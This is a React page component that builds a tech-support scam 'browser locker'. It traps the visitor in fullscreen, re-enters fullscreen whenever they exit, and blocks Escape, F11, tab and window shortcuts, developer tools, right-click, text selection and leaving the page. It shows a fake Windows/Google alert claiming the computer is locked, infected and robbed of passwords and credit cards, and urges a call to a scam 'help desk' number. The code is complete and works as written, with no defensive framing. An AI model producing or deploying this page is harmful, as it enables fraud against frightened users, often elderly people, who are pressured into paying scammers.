'use client';

import { useEffect, useState, useRef } from 'react';

export default function Home() {
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [clicked, setClicked] = useState(false);
  const overlayRef = useRef<HTMLDivElement>(null);

  const requestFullscreen = async () => {
    try {
      if (document.documentElement.requestFullscreen) {
        await document.documentElement.requestFullscreen();
      } else if ((document.documentElement as any).webkitRequestFullscreen) {
        await (document.documentElement as any).webkitRequestFullscreen();
      } else if ((document.documentElement as any).mozRequestFullScreen) {
        await (document.documentElement as any).mozRequestFullScreen();
      }
      setIsFullscreen(true);
    } catch (err) {
      console.log('Fullscreen request failed:', err);
    }
  };

  useEffect(() => {
    // Try to request fullscreen immediately on mount
    requestFullscreen();

    // Also try after a delay (browsers might allow it after page load)
    const timer1 = setTimeout(() => requestFullscreen(), 500);
    const timer2 = setTimeout(() => requestFullscreen(), 1000);
    const timer3 = setTimeout(() => requestFullscreen(), 2000);

    // Request fullscreen on user interaction as fallback
    if (clicked) {
      requestFullscreen();
    }

    // Prevent escape from fullscreen - more aggressive
    const handleFullscreenChange = () => {
      if (!document.fullscreenElement && !(document as any).webkitFullscreenElement) {
        setTimeout(() => requestFullscreen(), 100);
      }
    };

    document.addEventListener('fullscreenchange', handleFullscreenChange);
    document.addEventListener('webkitfullscreenchange', handleFullscreenChange);

    // Prevent ALL keyboard shortcuts
    const preventDefault = (e: KeyboardEvent) => {
      e.preventDefault();
      e.stopPropagation();
      return false;
    };

    const blockKeys = (e: KeyboardEvent) => {
      // Block Escape, F11, Ctrl+W, Cmd+W, Ctrl+T, Cmd+T, Alt+F4, etc.
      if (
        e.key === 'Escape' ||
        e.key === 'F11' ||
        (e.ctrlKey && (e.key === 'w' || e.key === 'W' || e.key === 't' || e.key === 'T' || e.key === 'l' || e.key === 'L')) ||
        (e.metaKey && (e.key === 'w' || e.key === 'W' || e.key === 't' || e.key === 'T' || e.key === 'l' || e.key === 'L')) ||
        (e.altKey && e.key === 'F4') ||
        (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.key === 'c' || e.key === 'C' || e.key === 'j' || e.key === 'J'))
      ) {
        return preventDefault(e);
      }
    };

    document.addEventListener('keydown', blockKeys, true);

    // Prevent context menu
    const preventContextMenu = (e: MouseEvent) => {
      e.preventDefault();
      e.stopPropagation();
    };

    document.addEventListener('contextmenu', preventContextMenu, true);

    // Block drag and drop
    const preventDrag = (e: DragEvent) => {
      e.preventDefault();
    };

    document.addEventListener('dragstart', preventDrag, true);
    document.addEventListener('drop', preventDrag, true);

    // Prevent text selection
    document.body.style.userSelect = 'none';
    document.body.style.webkitUserSelect = 'none';

    return () => {
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
      document.removeEventListener('webkitfullscreenchange', handleFullscreenChange);
      document.removeEventListener('keydown', blockKeys, true);
      document.removeEventListener('contextmenu', preventContextMenu, true);
      document.removeEventListener('dragstart', preventDrag, true);
      document.removeEventListener('drop', preventDrag, true);
      document.body.style.userSelect = '';
      document.body.style.webkitUserSelect = '';
    };
  }, [clicked]);

  const handleClick = () => {
    setClicked(true);
    requestFullscreen();
  };

  // Overlay to block clicks on browser UI
  useEffect(() => {
    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      e.preventDefault();
      e.returnValue = '';
      return '';
    };

    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, []);

  return (
    <div 
      className="min-h-screen bg-red-600 flex flex-col items-center justify-center p-8 font-sans select-none cursor-pointer"
      onClick={handleClick}
    >
      {/* Main Content */}
      <div className="max-w-2xl w-full bg-red-600 text-white">
        {/* Red Octagon with White X */}
        <div className="flex justify-start mb-8">
          <div className="relative w-20 h-20">
            <svg viewBox="0 0 100 100" className="w-full h-full">
              <polygon
                points="50,5 95,25 95,75 50,95 5,75 5,25"
                fill="#dc2626"
                stroke="#b91c1c"
                strokeWidth="2"
              />
              <text
                x="50"
                y="68"
                textAnchor="middle"
                fill="white"
                fontSize="50"
                fontWeight="bold"
                fontFamily="sans-serif"
              >
                ✕
              </text>
            </svg>
          </div>
        </div>

        {/* Warning Message */}
        <h1 className="text-5xl font-bold mb-6">
          Your computer has been Locked
        </h1>

        <p className="text-xl mb-8 leading-relaxed">
          Your computer with the IP address 182.74.27.50 has been infected by the Trojans -- Because System Activation KEY has expired & Your information (for example, passwords, messages, and credit cards) have been stolen. Call the Windows Help Desk +1-503-877-9717 (Helpline) to protect your files and identity from further damage.
        </p>

        {/* Checkbox and Link */}
        <div className="flex items-start gap-3 mb-8">
          <input type="checkbox" id="report" className="mt-1 w-5 h-5" />
          <label htmlFor="report" className="text-base">
            Automatically report details of possible security incidents to Google.{" "}
            <a href="#" className="underline hover:no-underline">
              Privacy policy
            </a>
          </label>
        </div>

        {/* Back to Safety Button */}
        <div className="flex justify-end">
          <button className="bg-red-700 hover:bg-red-800 text-white px-8 py-4 rounded-lg font-medium transition-colors text-lg">
            Back to safety
          </button>
        </div>
      </div>

    </div>
  );
}
